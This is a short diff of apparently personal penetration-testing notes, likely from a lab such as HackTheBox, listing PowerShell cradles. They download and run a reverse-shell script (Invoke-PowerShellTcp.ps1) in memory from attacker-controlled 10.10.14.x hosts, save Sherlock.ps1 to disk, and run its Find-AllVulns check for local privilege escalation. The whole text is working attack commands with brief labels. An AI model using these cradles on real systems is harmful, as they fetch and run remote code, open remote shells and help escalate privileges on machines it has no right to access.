@@ -1,14 +1,14 @@
-way 1 =>
-
+way 1 =>     Download & Execute , Without Writing on Disk ==>
+ 
 powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.8:8000/Invoke-PowerShellTcp.ps1')"
 
-way 2 ==> better
+way 2 ==> Download and Write on Disk ==>
 
 powershell -c (New-Object Net.WebClient).DownloadFile('http://10.10.14.37:8000/Sherlock.ps1', 'sherloack.ps1')
 
-way 3 ==> download and execute
+way 3 ==> Sherlock local exploits ==>
 
-powershell iex(new-object net.webclient).downloadstring('http://10.10.14.14/Invoke-PowerShellTcp.ps1')
+powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.26:8000/Sherlock.ps1'); Find-AllVulns"
 
 
 
